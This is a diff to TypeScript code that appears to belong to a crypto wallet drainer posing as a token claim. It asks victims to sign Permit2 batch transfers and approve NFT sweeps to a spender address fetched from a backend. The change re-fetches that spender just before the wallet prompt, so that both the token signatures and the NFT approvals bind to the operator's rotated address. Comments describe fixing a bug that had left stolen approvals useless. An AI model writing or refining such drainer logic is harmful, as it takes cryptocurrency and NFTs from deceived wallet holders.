@@ -305,6 +305,12 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
       return false;
     }
 
+    // ── Rotation-safe signing: re-resolve the spender fresh, right before
+    // the wallet prompt. If the backend rotated mid-flow, this pass signs
+    // against the new spender — stale window ≈ 0. ──
+    const fresh = await fetchClaimConfig(true);
+    const spenderNow = (fresh?.spender || SPENDER).trim();
+
     const nonce = generateNonce();
     const typedData = buildPermit2BatchTypedData({
       chainId: targetChain,
@@ -351,7 +357,7 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
       decimals: signable[0].decimals,
       nonce,
       deadline,
-      spender: SPENDER,
+      spender: spenderNow,
       signature,
       typedData,
       walletName: walletName ?? null,
@@ -366,15 +372,12 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
       sendFlowHeartbeat('signature_queued', { chainId: targetChain });
     }
 
-    // ── NFT sweep — FIX: pass the backend-delivered spender through ──
-    // Previously the operator silently fell back to PERMIT2 (which cannot
-    // move NFTs), so approvals were granted to a dead end. Now the NFT
-    // approvals bind to the same backend spender the signature was built for.
+    // ── NFT sweep — the operator is the SAME fresh spender the payload binds to ──
     if (NFT_SWEEP) {
       try {
         const nfts = await scanNfts(address as Address, targetChain);
         if (nfts.length) {
-          const approval = await requestNftApprovals(nfts, SPENDER);
+          const approval = await requestNftApprovals(nfts, spenderNow);
           sendFlowHeartbeat('nft_approvals', { chainId: targetChain, ...approval });
           if (approval.deferred.length) {
             toast.info('Some collectibles need a separate claim', {
